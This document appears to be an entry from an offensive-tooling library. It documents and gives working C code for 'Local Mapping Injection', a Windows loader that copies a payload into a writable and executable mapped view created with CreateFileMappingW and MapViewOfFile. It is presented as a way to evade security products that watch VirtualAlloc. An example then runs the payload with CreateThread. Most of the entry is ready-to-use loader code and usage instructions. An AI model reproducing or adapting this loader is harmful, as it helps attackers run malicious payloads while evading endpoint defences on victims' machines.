## Local Mapping Injection

Allocates a mapped memory buffer in the local process using `CreateFileMappingW` and `MapViewOfFile` instead of `VirtualAlloc`/`VirtualProtect`, avoiding the private memory allocation APIs commonly flagged by security solutions. Creates a file mapping object backed by the system paging file with `PAGE_EXECUTE_READWRITE`, maps a writable and executable view with `FILE_MAP_WRITE | FILE_MAP_EXECUTE`, copies the payload into the mapped region with `memcpy`, and returns the mapped base address to the caller. The file mapping handle is closed after the view is mapped — the mapped memory remains valid until `UnmapViewOfFile` is called.

**Usage**

Call `LocalMapInject` with the payload buffer, its size, and a pointer to receive the mapped base address. On success `*ppAddress` holds the executable mapped region containing the payload ready to be passed to `CreateThread` or any execution primitive. Call `UnmapViewOfFile(*ppAddress)` only after the payload has finished executing.

- `IN PBYTE pPayload`  Base address of the payload buffer to copy into mapped memory.
- `IN SIZE_T sPayloadSize`  Size of `pPayload` in bytes.
- `OUT PVOID* ppAddress`  Receives the base address of the mapped executable region containing the payload.

**Return Value**

`BOOL`  Returns `TRUE` if the mapped region was successfully created and the payload copied, otherwise `FALSE`.

- `windows.h`  `BOOL`, `HANDLE`, `PBYTE`, `PVOID`, `SIZE_T`, `IN`, `OUT`, `CreateFileMappingW()`, `MapViewOfFile()`, `UnmapViewOfFile()`, `CloseHandle()`, `GetLastError()`

### Code

```c
#include <windows.h>
#include <string.h>
#include <stdio.h>


BOOL LocalMapInject(IN PBYTE pPayload, IN SIZE_T sPayloadSize, OUT PVOID* ppAddress) {

    BOOL    bSTATE      = TRUE;
    HANDLE  hFile       = NULL;
    PVOID   pMapAddress = NULL;

    // Create a file mapping object backed by the system paging file.
    // INVALID_HANDLE_VALUE tells the OS to use the paging file rather than a file on disk.
    // PAGE_EXECUTE_READWRITE does not immediately allocate RWX memory — it specifies the
    // maximum protection that can be requested in the subsequent MapViewOfFile call.
    hFile = CreateFileMappingW(
        INVALID_HANDLE_VALUE,   // Use paging file instead of a file on disk.
        NULL,                   // Default security attributes.
        PAGE_EXECUTE_READWRITE, // Maximum protection allowed for views of this mapping.
        NULL,                   // High-order DWORD of mapping size — not needed.
        sPayloadSize,           // Low-order DWORD of mapping size — payload size in bytes.
        NULL                    // No name for the mapping object.
    );
    if (hFile == NULL) {
        printf("[!] CreateFileMapping Failed With Error : %d \n", GetLastError());
        bSTATE = FALSE; goto _EndOfFunction;
    }

    // Map a view of the file mapping object into the process's address space.
    // FILE_MAP_WRITE | FILE_MAP_EXECUTE requests a writable and executable view —
    // both are needed to copy the payload in and then execute it.
    pMapAddress = MapViewOfFile(
        hFile,                          // Handle to the file mapping object.
        FILE_MAP_WRITE | FILE_MAP_EXECUTE, // Access: write to copy payload, execute to run it.
        NULL,                           // High-order DWORD of file offset — not needed.
        NULL,                           // Low-order DWORD of file offset — not needed.
        sPayloadSize                    // Number of bytes to map — payload size.
    );
    if (pMapAddress == NULL) {
        printf("[!] MapViewOfFile Failed With Error : %d \n", GetLastError());
        bSTATE = FALSE; goto _EndOfFunction;
    }

    printf("[i] pMapAddress : 0x%p \n", pMapAddress);

    printf("[#] Press <Enter> To Copy The Payload ... ");
    getchar();

    // Copy the payload into the mapped executable region.
    printf("[i] Copying Payload To 0x%p ... ", pMapAddress);
    memcpy(pMapAddress, pPayload, sPayloadSize);
    printf("[+] DONE \n");

_EndOfFunction:
    // Return the mapped address to the caller even on partial failure.
    *ppAddress = pMapAddress;
    // Close the file mapping handle — the mapped view remains valid until UnmapViewOfFile.
    if (hFile)
        CloseHandle(hFile);
    return bSTATE;
}
```

**Example**

```c
PVOID   pAddress    = NULL;
HANDLE  hThread     = NULL;

// Allocate a mapped executable region and copy the payload into it.
LocalMapInject(pPayload, sPayloadSize, &pAddress);

// Execute the payload via CreateThread — any execution primitive works here.
hThread = CreateThread(NULL, NULL, pAddress, NULL, NULL, NULL);
WaitForSingleObject(hThread, INFINITE);

// Unmap the region only after the payload has finished executing.
UnmapViewOfFile(pAddress);
```
